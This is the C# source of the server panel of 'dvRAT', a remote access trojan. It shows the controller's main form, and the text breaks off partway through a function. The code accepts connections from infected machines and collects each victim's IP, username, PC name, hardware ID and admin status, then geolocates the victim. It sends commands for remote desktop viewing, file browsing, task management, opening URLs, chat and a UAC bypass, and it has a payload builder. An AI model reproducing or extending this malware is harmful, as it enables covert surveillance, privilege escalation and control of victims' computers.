// *
// * dvRAT
// * @copyright      Copyright (c) DEvil. (https://www.instagram.com/justalghamdi AKA https://www.github.com/justalghamdi)
// * @author         justalghamdi
// *
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Net;
using Newtonsoft.Json.Linq;
using System.IO;

namespace dvrat
{
    public partial class MainForm : Form
    {

        public MainForm()
        {
            InitializeComponent();
        }

        #region pub vars
        //Pub vars in the namespace
        private IPEndPoint endPoint = new IPEndPoint(IPAddress.Any, 8080);
        private List<Socket> clients_sockets = new List<Socket>();
        private static Socket listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private int selected_client_index = 0;
        private List<Thread> clients_threads = new List<Thread>();
        private static string dvrat_folder = "dvR.A.T";
        private NotifyIcon notifyIcon = null;
        private int AllRecv = 0;
        private int AllSend = 0;
        private int AllConn = 0;
        private int AllDisconn = 0;
        private StatusForm stf = new StatusForm();
        private Stopwatch stopwatch = new Stopwatch();
        private DateTime start_time;
        #endregion

        #region form functions
        //its functions that mmake changes or help you to control form .


        private void Form1_Deactivate(object sender, EventArgs e)
        {
            this.Opacity = 0.7;
            is_focus_label1.Text = "IS_FOCUS [ false ]";
        }

        private void Form1_Activated(object sender, EventArgs e)
        {
            this.Opacity = 1;
            is_focus_label1.Text = "IS_FOCUS [ true ]";
        }

        private void exit_x_label_MouseHover(object sender, EventArgs e)
        {
            exit_x_label.ForeColor = Color.Black;
        }

        private void exit_x_label_MouseLeave(object sender, EventArgs e)
        {
            exit_x_label.ForeColor = Color.White;
        }

        private void minimized_label_MouseHover(object sender, EventArgs e)
        {
            minimized_label.ForeColor = Color.Black;
        }

        private void minimized_label_MouseLeave(object sender, EventArgs e)
        {
            minimized_label.ForeColor = Color.White;
        }

        private void exit_x_label_Click(object sender, EventArgs e)
        {
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
            Process.GetCurrentProcess().Kill();
        }


        private void minimized_label_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void about_linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            new AboutBox().ShowDialog();
        }

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if(this.WindowState == FormWindowState.Minimized)
            {
                this.WindowState = FormWindowState.Normal;
            }
            this.Focus();
        }
        
        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            notifyIcon.Visible = false;
            notifyIcon.Dispose();
            Process.GetCurrentProcess().Kill();
        }
        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImport("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();

        private void header_1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void current_time()
        {
            for (; ; )
            {
                current_time_label.Invoke(new MethodInvoker(() =>
                {
                    current_time_label.Text = string.Format("[ {0:HH:mm:ss tt} ]", DateTime.Now);
                }));
                Thread.Sleep(1000);
            }
        }

        private void update_memory_usage()
        {
            Process currentProcess = System.Diagnostics.Process.GetCurrentProcess();
            long totalBytesOfMemoryUsed = 0;
            for (; ; )
            {
                totalBytesOfMemoryUsed = currentProcess.WorkingSet64;
                mem_usage_label.Invoke(new MethodInvoker(() =>
                {
                    mem_usage_label.Text = $"RAM [ {DataSize(totalBytesOfMemoryUsed)} ]";
                }));
                Thread.Sleep(1000);
            }
        }


        private void update_cpu_usage()
        {
            float cpu_usage = 0;
            PerformanceCounter cpu = new PerformanceCounter("Process", "% Processor Time", Process.GetCurrentProcess().ProcessName);

            for (; ; )
            {
                cpu_usage = Convert.ToSingle(System.Convert.ToInt32(Math.Round(System.Convert.ToDouble((cpu.NextValue() / (double)System.Convert.ToSingle(Environment.ProcessorCount))))));
                cpu_usage_label.Invoke(new MethodInvoker(() =>
                {
                    cpu_usage_label.Text = $"CPU [ {string.Format("{0:0.00}%", cpu_usage)} ]";
                }));
                Thread.Sleep(1000);
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            start_time = DateTime.Now;
            stopwatch.Start();
            dvrat_folder = $"Devil R.A.T {ProductVersion}";
            if (!Directory.Exists(dvrat_folder))
            {
                Directory.CreateDirectory(dvrat_folder);
            }
            contextMenuStrip1.Enabled = false;
            log_box.HorizontalScrollbar = true;
            threads_label.Location = new Point(529, 427);
            socket_label.Location = new Point(597, 427);
            threads_label.Text = $"Threads [{Process.GetCurrentProcess().Threads.Count}]";
            this.Width = 1004;
            this.Height = 450;
            if (notifyIcon == null)
            {
                notifyIcon = new NotifyIcon();
                notifyIcon.Icon = ResourceFile.dv;
                notifyIcon.Visible = true;
                notifyIcon.Text = "dvRAT";
                notifyIcon.ContextMenuStrip = this.contextMenuStrip2;
            }
            new Thread(new ThreadStart(new Action(() => { startServer(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { refresh_clients(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { scroll_down_log(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { refresh_form(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { zeroUpDw_Labels(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { current_time(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { update_memory_usage(); }))).Start();
            new Thread(new ThreadStart(new Action(() => { update_cpu_usage(); }))).Start();

        }

        private void log_link_label_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (log_link_label.Text.Contains("Logs"))
            {
                this.Width = 1368;
                log_link_label.Text = "[ Hide ]";
            }
            else
            {
                this.Width = 1004;
                log_link_label.Text = "[ Logs ]";
            }
        }

        private void status_form_label_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            try
            {
                if (!is_form_opened("StatusForm"))
                {
                    stf = new StatusForm();
                    stf.Show();
                    new Thread(new ThreadStart(() =>
                    {
                        while (is_form_opened("StatusForm"))
                        {
                            stf.SetStatus(AllRecv, AllSend, AllConn, AllDisconn, start_time.ToString("yyyy-MM-dd HH:mm:ss").Replace('-', '/'),stopwatch.Elapsed.ToString("hh\\:mm\\:ss"));
                            Thread.Sleep(950);
                        }
                    })).Start();
                }
                else
                {
                    stf.Focus();
                }
            }catch(Exception ex)
            {
                error_log_file(ex.ToString());
            }
        }

        private void builder_link_label_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            new BuilderForm().ShowDialog(); ;
        }

        private void messageBoxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    ConfigMessageBox cnf_msg_bx = new ConfigMessageBox(client, this);
                    cnf_msg_bx.ShowDialog();
                }
            }
        }


        private void oPENCDROMToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "open_cd_rom;");
                }
            }
        }

        private void rDPToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "rdpstart;");
                }
            }
        }


        private void tASKMANEGARToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "get_tsk_mgr;");
                }
            }
        }

        private void cHATToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "start_chat;");
                }
            }
        }

        private void fILEEXPLORERToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "get_main_dirs;");
                }
            }
        }
        private void uACBYPASSToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, "uacbypass;");
                }
            }
        }

        private void openwebToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string url = Microsoft.VisualBasic.Interaction.InputBox("Open Url\nNote: If you just press enter without change any thing it will open the browser on client side", "URL", "http://", 100, 200);
            Socket client = get_client_by_index(this.selected_client_index);
            if (client != null)
            {
                if (!delete_if_not_connect(client))
                {
                    send_to_client(client, $"open_this_url;\n{url}");
                }
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            int count = clients_sockets.Count;
            int count2 = clients_threads.Count;
            for (int i = 0; i < count2; i++){
                clients_threads[i].Abort();
            }
            for (int i = 0; i < count; i++)
            {
                try
                {
                    Socket client = get_client_by_index(0);
                    send_to_client(client, "recon;");
                    client.Disconnect(false);
                    client.Close();
                    clients_sockets.RemoveAt(get_client_index(client));
                }
                catch (Exception ex) {
                    error_log_file(ex.ToString());
                }
            }

            dataGridView1.Rows.Clear();
        }

        private void zeroUpDw_Labels()
        {
            while (true)
            {
                try
                {
                    if (!download_label.Text.Contains("0 Bytes"))
                    {
                        Thread.Sleep(1000);
                        download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(0)} ]"; }));
                    }
                    if (!upload_label.Text.Contains("0 Bytes"))
                    {
                        Thread.Sleep(1000);
                        upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(0)} ]"; }));
                    }
                    Thread.Sleep(1000);
                }catch(Exception ex)
                {
                    error_log_file(ex.ToString());
                }
            }
        }

        private bool delete_if_not_connect(Socket client)
        {
            if (!SocketConnected(client))
            {
                try
                {
                    int index_of_client = get_client_index(client);
                    if (index_of_client != -1)
                    {
                        dataGridView1.Rows.RemoveAt(index_of_client);
                    }
                    return true;
                }
                catch (Exception ex)
                {
                    error_log_file(ex.ToString());
                    return false;
                }
            }
            else
            {
                return false;
            }
        }

        private void refresh_form()
        {
            while (true)
            {
                threads_label.Invoke(new MethodInvoker(() =>
                {
                    threads_label.Text = $"Threads [{Process.GetCurrentProcess().Threads.Count}]";
                }));
                try
                {
                    Invoke(new MethodInvoker(()=> {
                        download_label.Text = "Download [ 0 Bytes ]";
                        upload_label.Text = "Upload [ 0 Bytes ]";
                        connections_label.Text = $"Connections [ {clients_sockets.Count} ]";
                    }));

                    if (dataGridView1.Rows.Count != 0)
                    {
                        if (contextMenuStrip1.InvokeRequired)
                        {
                            contextMenuStrip1.Invoke(new MethodInvoker(() =>
                            {
                                contextMenuStrip1.Enabled = true;
                            }));
                        }
                        else
                        {
                            contextMenuStrip1.Enabled = true;
                        }
                    }
                    else
                    {
                        if (contextMenuStrip1.InvokeRequired)
                        {
                            contextMenuStrip1.Invoke(new MethodInvoker(() =>
                            {
                                contextMenuStrip1.Enabled = false;
                            }));
                        }
                        else
                        {
                            contextMenuStrip1.Enabled = false;
                        }
                    }

                    Thread.Sleep(1000);
                }
                catch (Exception ex)
                {
                    error_log_file(ex.ToString());
                }
            }
        }

        private void scroll_down_log()
        {
          
                while (true)
                {
                try
                {
                    this.Invoke(new MethodInvoker(() => {
                        int visibleItems = log_box.ClientSize.Height / log_box.ItemHeight;
                        log_box.TopIndex = Math.Max(log_box.Items.Count - visibleItems + 1, 0);
                    }));
                    Thread.Sleep(100);
                }
                catch (Exception ex)
                {
                    error_log_file(ex.ToString());
                }
            }
           
        }

        private void dataGridView1_CellMouseMove(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.RowIndex >= 0 && e.ColumnIndex >= 0)
            {
                this.selected_client_index = e.RowIndex;
                selected_client_label.Text = $"SELECTED_CLIENT [ {this.selected_client_index} ]";
            }
        }



        #endregion

        #region helper functions
        //it is Fucntions help you in someting like get info of an ip or get The size of data in string etc...

        private bool is_form_opened(string name)
        {
            if (Application.OpenForms[name] != null)
            {
                return true;
            }
            return false;
        }

        private bool IsThereImportentFormOpen()
        {
            if (Application.OpenForms["chat_form"] != null)
            {
                return true;
            }
            if(Application.OpenForms["RemoteDesktop"] != null)
            {
                return true;
            }
            return false;
        }

        private void log_client_messages(string user_folder, string username , string message) {
        try_again:;
            try
            {
                string file_name = $"{user_folder}\\{username}.dv.txt";
                string time = DateTime.Now.ToString();
                string log = $"{time} {message}\n";
                Byte[] bLog = new UTF8Encoding(true).GetBytes(log);
                FileStream fs;
                StreamWriter sw;
                if (!Directory.Exists(user_folder))
                {
                    Directory.CreateDirectory(user_folder);

                    using (fs = File.Create(file_name))
                    {
                        fs.Write(bLog, 0, bLog.Length);
                    }

                }
                else if (!File.Exists(file_name))
                {
                    using (fs = File.Create(file_name))
                    {
                        fs.Write(bLog, 0, bLog.Length);
                    }
                }
                else
                {
                    FileInfo fi = new FileInfo(file_name);
                    if (fi.Length > 300_000)
                    {
                        File.Delete(file_name);
                    }
                    using (sw = File.AppendText(file_name))
                    {
                        sw.WriteLine(log);
                    }
                }
            } catch (Exception ex)
            {
                error_log_file(ex.ToString());
                goto try_again;

            }
        }

        public void error_log_file(string error)
        {
        try_again:;
            try
            {
                string folder_name = $"{dvrat_folder}\\R.A.T Server\\log";
                string file_name = $"{folder_name}\\error.dv.log.txt";
                string time = DateTime.Now.ToString();
                string log = $"{time} {error}\n";
                Byte[] bLog = new UTF8Encoding(true).GetBytes(log);
                FileStream fs;
                StreamWriter sw;
                if (!Directory.Exists(folder_name))
                {
                    Directory.CreateDirectory(folder_name);

                    using (fs = File.Create(file_name))
                    {
                        fs.Write(bLog, 0, bLog.Length);
                    }

                }
                else if (!File.Exists(file_name))
                {
                    using (fs = File.Create(file_name))
                    {
                        fs.Write(bLog, 0, bLog.Length);
                    }
                }
                else
                {
                    FileInfo fi = new FileInfo(file_name);
                    if (fi.Length > 300_000)
                    {
                        File.Delete(file_name);
                    }
                    using (sw = File.AppendText(file_name))
                    {
                        sw.WriteLine(log);
                    }
                }
            }
            catch (Exception)
            {
                GC.Collect();
                goto try_again;

            }
            GC.Collect();
        }

        private string getIpInfo(string ip)
        {
            WebClient wb = new WebClient();
            string ip_info = wb.DownloadString($"http://ip-api.com/json/{ip}");
            return ip_info;
        }

        public string DataSize(long len)
        {
            if ((len.ToString().Length < 4))
                return (len.ToString() + " Bytes");
            string strsize = null;
            double _size = (Convert.ToDouble(len) / 1024);
            if ((_size < 1024))
                strsize = "KB";
            else
            {
                _size = (_size / 1024);
                if ((_size < 1024))
                    strsize = "MB";
                else
                {
                    _size = (_size / 1024);
                    strsize = "GB";
                }
            }
            return (_size.ToString(".0") + " " + strsize);
        }

        private string[] xSplit(string toSplit, string splitOn)
        {
            return toSplit.Split(new string[] { splitOn }, StringSplitOptions.None);
        }
        #endregion

        #region server functions 
        //it is Functions that make changes/check/etc... with sockets and you use sockets in them .
        public Tuple<string, int> recv_dv(Socket client)
        {
      
                // ----------START-DEVIL-PROTOCOL----------
                // tent-ln:999
                // ----------END-DEVIL-PROTOCOL----------
                int bytes_recv = 0;
                byte[] buffer_recv = new byte[4096/*4 KB*/];
                string[] headers = null;
                string string_buffer = null, content = null;
                int content_length = 0;
                int recved_bytes = 0;
            bytes_recv = client.Receive(buffer_recv);
            AllRecv += bytes_recv;
                string_buffer = Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                if (!string_buffer.Contains("----------START-DEVIL-PROTOCOL----------"))
                {
                    return Tuple.Create("", 0);
                }

                //if (string_buffer.Contains("PNG")){}

                headers = xSplit(string_buffer, "\r\n");
                foreach (string header in headers)
                {
                    if (header.Contains("tent-ln:"))
                    {
                        content_length = Int32.Parse(header.Substring("tent-ln:".Length));
                        break;
                    }
                }
                recved_bytes += bytes_recv;
                do
                {
                    if (string_buffer.Contains("----------END-DEVIL-PROTOCOL----------"))
                    {
                        break;
                    }
                    bytes_recv = client.Receive(buffer_recv);
                AllRecv += bytes_recv;

                recved_bytes += bytes_recv;
                    string_buffer += Encoding.Default.GetString(buffer_recv, 0, bytes_recv);
                } while (recved_bytes <= content_length);
                headers = xSplit(string_buffer, "\r\n\r\n");
                content = headers[1];
                content = content.Replace("----------END-DEVIL-PROTOCOL----------", "").Replace("----------START-DEVIL-PROTOCOL----------","");
                return Tuple.Create(content, content_length);
        }

        public bool send_to_client(Socket client, string message)
        {
            try
            {
                int send_bytes = client.Send(Encoding.Default.GetBytes(message));
                AllSend += send_bytes;
                upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; upload_label.Refresh(); }));
                return true;
            }
            catch (Exception ex)
            {
                error_log_file(ex.ToString());
                return false;
            }
        }

        private int get_client_index(Socket client_socket)
        {
            try
            {
               return clients_sockets.IndexOf(client_socket);
            }
            catch (Exception ex)
            {
                error_log_file(ex.ToString());
                return -1;
            }
        }

        public Socket get_client_by_index(int i)
        {
            try
            {
                return this.clients_sockets[i];
            }
            catch (Exception ex)
            {
                try
                {
                    error_log_file(ex.ToString());
                    dataGridView1.Rows.RemoveAt(i);//Client not on index
                    return null;
                }
                catch (Exception _ex)
                {
                    error_log_file(_ex.ToString());
                    return null;
                }
            }
            finally
            {
                //pass
            }
        }



        bool SocketConnected(Socket s)
        {
            try
            {

                if (s == null)
                    return false;
                bool part1 = s.Poll(1000, SelectMode.SelectRead);
                bool part2 = (s.Available == 0);
                if (part1 && part2)
                    return false;
                else
                {
                    try
                    {
                        int sentBytesCount = s.Send(new byte[0x01], 0x01, 0x00);
                        AllSend += sentBytesCount;
                        return sentBytesCount == 1;
                    }
                    catch (Exception ex)
                    {
                        error_log_file(ex.ToString());
                        return false;
                    }
                }
            }
            catch (Exception ex)
            {
                error_log_file(ex.ToString());
                return false;
            }
        }


        private void refresh_clients()
        {
            while (true)
            {
                int clients_count = clients_sockets.Count;
                int gird_count = dataGridView1.Rows.Count;
                try
                {
                    
                    for (int i = 0; i < gird_count; i++)
                    {
                        if(get_client_by_index(i) == null)
                        {
                            remove_grid(i);
                        }
                    }
                    for (int i = 0; i < clients_count; i++)
                    {
                        Socket client = clients_sockets[i];
                        if (SocketConnected(client))
                        {
                            if (!IsThereImportentFormOpen())
                            {
                                int send_bytes = client.Send(Encoding.Default.GetBytes("refresh;"));
                                AllSend += send_bytes;
                                upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; upload_label.Refresh(); }));
                            }
                            else
                            {
                                log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: We don\'t send refresh because you open form!"); }));

                            }

                        }
                        else
                        {
                            clients_sockets.RemoveAt(get_client_index(client));
                        }
                    }
                }
                catch (Exception ex)
                {
                    error_log_file(ex.ToString());
                }
                Thread.Sleep(1500);
            }
        }



        private void remove_client_and_grid(Socket client, int index_of_grid)
        {
            int index = get_client_index(client);
            if(index == -1)
            {
                remove_grid(index_of_grid);
                goto end;
            }
            int GridRows = dataGridView1.Rows.Count;
            int clients = clients_sockets.Count;
            if(GridRows == clients)
            {
                clients_sockets.RemoveAt(index);
                if (index == index_of_grid)
                {
                    if (!dataGridView1.InvokeRequired)
                    {
                        remove_grid(index_of_grid);
                        dataGridView1.Refresh();
                    }
                    else
                    {
                        dataGridView1.Invoke(new MethodInvoker(() =>
                        {
                            remove_grid(index_of_grid);
                            dataGridView1.Refresh();
                        }));
                    }
                }
                else
                {
                    if (!dataGridView1.InvokeRequired)
                    {
                        remove_grid(index_of_grid);
                        dataGridView1.Refresh();
                    }
                    else
                    {
                        dataGridView1.Invoke(new MethodInvoker(() =>
                        {
                            remove_grid(index_of_grid);
                            dataGridView1.Refresh();
                        }));
                    }
                }
            }
        end:;
        }
        
        private void remove_grid(int index)
        {
            try
            {
                if (!dataGridView1.InvokeRequired)
                {
                    dataGridView1.Rows.RemoveAt(index);
                    dataGridView1.Refresh();
                }
                else
                {
                    dataGridView1.Invoke(new MethodInvoker(() =>
                    {
                        dataGridView1.Rows.RemoveAt(index);
                        dataGridView1.Refresh();
                    }));
                }
            }catch(Exception ex)
            {
                this.error_log_file(ex.ToString());
            }
        }

        private void dealing_with_the_client(Socket client_socket)
        {
        _start:
            client_socket.ReceiveTimeout = 10 * 1000;
            string user_folder = $"{dvrat_folder}\\#HWID";
            bool is_admin = false;
            string client_username_main_dir = "#client_main_disk\\Users\\#client_username";
            string client_MAIN_DISK = null;
            string client_ALL_DISK = null;
            string client_windows_username = null;
            string client_pc_name = null;
            string client_win_main_dir = null;
            string ip = null;
            Bitmap country_image = null;
            int index_of_client_socket = get_client_index(client_socket);
            int index_of_row = 0;
            string string_recv = null;
            int content_length = 0;
            Tuple<string, int> tp;
            ChatForm cht_frm = null;
            FileExplorer fle_explr_frm = null;
            RemoteDesktop rdp = new RemoteDesktop();
            TaskManger tsk_mgr_form = null;
            bool doesgetinfo = false;
            string active_window = null;
            int times_to_check = 0;
            try
            {
                int send_bytes = client_socket.Send(Encoding.Default.GetBytes("getinfo;"));
                AllSend += send_bytes;
                upload_label.Invoke(new MethodInvoker(() => { upload_label.Text = $"Upload [ {DataSize(send_bytes)} ]"; }));

                while (client_socket.Connected)
                {
                    try
                    {
                        if (times_to_check == 3)
                        {
                            if (!doesgetinfo)
                            {
                                clients_sockets.RemoveAt(get_client_index( client_socket));
                                client_socket.Disconnect(false);
                                client_socket.Close();
                                break;
                            }
                        }
                        if (!SocketConnected(client_socket))
                        {
                            break;
                        }
                        index_of_client_socket = get_client_index(client_socket);

                        if (doesgetinfo)
                        {
                            if (index_of_client_socket == -1)
                            {
                                remove_grid(index_of_row);
                                break;
                            }
                            if (index_of_row != index_of_client_socket)
                            {
                                index_of_row = index_of_client_socket;
                                dataGridView1.Rows[index_of_row].Cells[0].Value = country_image;
                                dataGridView1.Rows[index_of_row].Cells[1].Value = ip;
                                dataGridView1.Rows[index_of_row].Cells[3].Value = client_windows_username;
                                dataGridView1.Rows[index_of_row].Cells[4].Value = client_pc_name;
                                dataGridView1.Rows[index_of_row].Cells[5].Value = is_admin ? "true" : "false";
                                dataGridView1.Rows[index_of_row].Cells[6].Value = "online";
                            }
                            else
                            {
                                dataGridView1.Rows[index_of_row].Cells[0].Value = country_image;
                                dataGridView1.Rows[index_of_row].Cells[1].Value = ip;
                                dataGridView1.Rows[index_of_row].Cells[3].Value = client_windows_username;
                                dataGridView1.Rows[index_of_row].Cells[4].Value = client_pc_name;
                                dataGridView1.Rows[index_of_row].Cells[5].Value = is_admin ? "true" : "false";
                                dataGridView1.Rows[index_of_row].Cells[6].Value = "online";
                            }
                        }
                        try
                        {
                            tp = recv_dv(client_socket);
                            string_recv = tp.Item1;
                            content_length = tp.Item2;
                        }
                        catch (Exception ex)
                        {
                            error_log_file(ex.ToString());
                            if (!doesgetinfo)
                            {
                                times_to_check++;
                            }
                            continue;
                        }


                    }
                    catch (Exception ex)
                    {
                        error_log_file(ex.ToString());
                        continue;
                    }

                    if (string_recv.Length == 0)
                    {

                        continue;
                    }
                    try
                    {
                        if (string_recv.Length < 10_000 && !string_recv.ToLower().Contains("png"))
                        {
                            if (!user_folder.Contains("#HWID"))
                            {
                                if (!string_recv.Contains("ok_refresh;"))
                                {
                                    log_client_messages(user_folder, $"{client_pc_name}_{client_windows_username}", $"\nCLIENT_NUMBER[{index_of_client_socket}]\nMessage Size: {DataSize(string_recv.Length)}\nMessage: \n{string_recv}\n--------------------------------\n");
                                }
                            }
                            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: recv from client: {string_recv}"); }));
                        }
                    }
                    catch (Exception ex)
                    {
                        error_log_file(ex.ToString());
                        log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: recv from client: Bytes"); }));
                    }
                    download_label.Invoke(new MethodInvoker(() => { download_label.Text = $"Download [ {DataSize(string_recv.Length)} ]"; download_label.Refresh(); }));
                    if (string_recv.StartsWith("start_up_info;"))
                    {

                        connections_label.Invoke(new MethodInvoker(() => { connections_label.Text = $"Connections [ {clients_sockets.Count} ]"; }));
                        string remove_tag = string_recv.Substring(14);
                        string[] info_array = remove_tag.Split('\n');
                        ip = info_array[0];
                        active_window = info_array[1];
                        client_windows_username = info_array[2];
                        client_pc_name = info_array[3];
                        client_win_main_dir = info_array[4];
                        client_MAIN_DISK = client_win_main_dir.Split('\\')[0];
                        string[] disks_arr = xSplit(info_array[5], "&=");
                        string HWID = info_array[6].Replace("{", "").Replace("}", "").Replace("-", "");
                        user_folder = user_folder.Replace("#HWID", $"{client_pc_name}_{client_windows_username}-{HWID}");
                        is_admin = string_recv.Contains("true_admin") ? true : false;

                        for (int i = 1; i < disks_arr.Length; i++)
                        {
                            if (!disks_arr[i].Contains("END"))
                            {
                                client_ALL_DISK += disks_arr[i].Trim() + '\n';
                            }
                        }
                        if (!ip.Contains("ERR_WHILE_GET_IP"))
                        {
                            string ip_info = getIpInfo(ip);
                            var obj = JObject.Parse(ip_info);
                            string country_code = $"{obj["countryCode"]}";
                            try
                            {
                                country_image = new Bitmap($"res\\Flags\\{country_code.ToLower()}.png");
                            }
                            catch (Exception ex)
                            {
                                error_log_file(ex.ToString());
                                country_image = new Bitmap($"res\\Flags\\-1.png");
                            }
                            dataGridView1.Invoke(new MethodInvoker(() =>
                            {
                                index_of_row = dataGridView1.Rows.Add(
                                country_image,
                                ip,
                                active_window,
                                client_windows_username,
                                client_pc_name,
                                is_admin ? "true" : "false",
                                "online"
                                );
                            }));
                            if (!Directory.Exists(user_folder))
                            {
                                string[] di = Directory.GetDirectories(dvrat_folder);
                                foreach (string folder in di)
                                {
                                    if (folder.Contains(HWID))
                                    {
                                        goto end;
                                    }
                                }
                                Directory.CreateDirectory(user_folder);
                            }
                        end:;
                        }
                        else
                        {

                            country_image = new Bitmap($"res\\Flags\\-1.png");
                            dataGridView1.Invoke(new MethodInvoker(() =>
                            {
                                index_of_row = dataGridView1.Rows.Add(
                                country_image,
                                "ERR_WHILE_GET_IP",
                                active_window,
                                client_windows_username,
                                client_pc_name,
                                is_admin ? "true" : "false",
                                "online");
                            }));
                            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: err in get client ip"); }));
                        }

                        doesgetinfo = true;
                        log_client_messages(user_folder, $"{client_pc_name}_{client_windows_username}", $"\nCLIENT_NUMBER[{index_of_client_socket}]\nMessage Size: {DataSize(string_recv.Length)}\nMessage: {string_recv}\n--------------------------------\n");

                    }
                    if (!doesgetinfo)
                    {
                        times_to_check++;
                        Thread.Sleep(1000);
                        continue;
                    }

                    if (string_recv.StartsWith("rdframe;"))
                    {

                        string frame_string = string_recv.Substring("rdframe;\n".Length);
                        byte[] frame = Encoding.Default.GetBytes(frame_string);

                        if (!is_form_opened("RemoteDesktop"))
                        {
                            rdp.parent = this;
                            rdp.client = client_socket;
                            rdp.user_folder = user_folder;
                            rdp.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();

                            new Thread(new ThreadStart(() =>
                            {
                                rdp.ShowDialog();
                            })).Start();
                            rdp.SetFrame(frame);
                        }
                        else
                        {
                            if (!rdp.watch)
                            {
                                rdp.sw = Stopwatch.StartNew();
                                rdp.watch = true;
                            }
                            rdp.SetFrame(frame);
                            rdp.FPS++;
                            rdp.UpdateFPS();
                        }

                    }
                    else if (string_recv.Contains("rdpend;"))
                    {
                        if (is_form_opened("RemoteDesktop"))
                        {
                            rdp.Close();
                        }
                    }
                    else if (string_recv.StartsWith("start_chat;"))
                    {
                        cht_frm = new ChatForm(client_socket, this);
                        new Thread(new ThreadStart(new Action(() =>
                        {
                            cht_frm.ShowDialog();
                        }))).Start();
                    }
                    else if (string_recv.StartsWith("ok_refresh;"))
                    {
                        dataGridView1.Rows[index_of_row].Cells["_client_status"].Value = "online";
                        string[] tags = string_recv.Split('\n');
                        string window_name = tags[1].Substring(10);
                        try
                        {
                            dataGridView1.Invoke(new MethodInvoker(() =>
                            {
                                dataGridView1.Rows[index_of_row].Cells["_active_window"].Value = "";
                                dataGridView1.Rows[index_of_row].Cells["_active_window"].Value = window_name;
                            }));
                            log_box.Invoke(new MethodInvoker(() => { log_box.Items.Add($"log: client number {index_of_client_socket} send OK"); }));
                        }
                        catch (Exception ex)
                        {
                            error_log_file(ex.ToString());
                        }

                    }
                    else if (string_recv.StartsWith("tsk_mgr;"))
                    {
                        string tsk_mgr = xSplit(string_recv, "\n")[1];
                        JObject tsk_obj = JObject.Parse(tsk_mgr);
                        tsk_mgr_form = new TaskManger(client_socket, this, tsk_obj);
                        tsk_mgr_form.victm_name = dataGridView1.Rows[this.selected_client_index].Cells["_PC_NAME"].Value.ToString();
                        tsk_mgr_form.ShowDialog();

                    }
                    else if (string_recv.StartsWith("client_new_message;"))
                    {
                        string message = string_recv.Substring("client_new_message;".Length);
                        if (message.Contains("force_close"))
                        {
                            send_to_client(client_socket, "start_chat;");//force reopen
                        }
                        else
                        {
                            cht_frm.add_to_list(message);
                        }
                    }
                    else if (string_recv.StartsWith("client_recv_main_dir;"))
                    {

                        string sub_it = string_recv.Substring("client_recv_main_dir;".Length);
                        if (sub_it.Contains("err"))
                        {
                            fle_explr_frm._err("can't open file\\folder!");
                        }
                        else
                        {
                            string[] tags = sub_it.Split('\n');
                            string files = tags[1];
                            try
                            {
                                JObject files_obj = JObject.Parse(files);
                                fle_explr_frm.load_main_files(files_obj);

                            }
                            catch (Exception ex)
                            {
